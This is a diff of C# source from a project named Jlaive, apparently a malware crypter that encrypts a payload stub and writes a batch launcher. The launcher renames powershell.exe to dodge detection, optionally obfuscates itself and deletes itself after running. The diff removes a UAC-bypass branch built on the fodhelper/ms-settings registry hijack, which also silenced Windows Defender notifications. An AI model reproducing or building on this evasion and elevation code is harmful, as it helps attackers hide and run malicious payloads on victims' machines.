@@ -69,24 +69,13 @@ namespace Jlaive
             string key = RandomString(20, rng);
             byte[] encrypted = XORCrypt(Compress(stubbytes), key);
             string command = StubGen.CreatePS(key, hidden.Checked, rng);
-
             StringBuilder toobf = new StringBuilder();
             toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
             toobf.AppendLine("cls");
-            if (bypassUAC.Checked)
-            {
-                toobf.AppendLine(@"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f >nul");
-                toobf.AppendLine(@"cmd /c reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /d %p% /f");
-                toobf.AppendLine("fodhelper");
-                toobf.AppendLine(@"reg delete HKCU\Software\Classes\ms-settings\shell\open\command /f >nul");
-                toobf.AppendLine(@"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /f >nul");
-            }
-            else toobf.AppendLine(command);
-            toobf.AppendLine("powershell -noprofile -executionpolicy bypass -command while ([System.Diagnostics.Process]::GetProcessesByName('pshell').Length -gt 0) { start-sleep 1; }");
+            toobf.AppendLine(command);
             toobf.Append("del pshell.exe");
             StringBuilder output = new StringBuilder();
             output.AppendLine("@echo off");
-            if (bypassUAC.Checked) output.AppendLine($"set \"p=^\"%~dp0{command}^\"\"");
             if (obfuscate.Checked) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
             else output.AppendLine(toobf.ToString());
             if (selfDelete.Checked) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
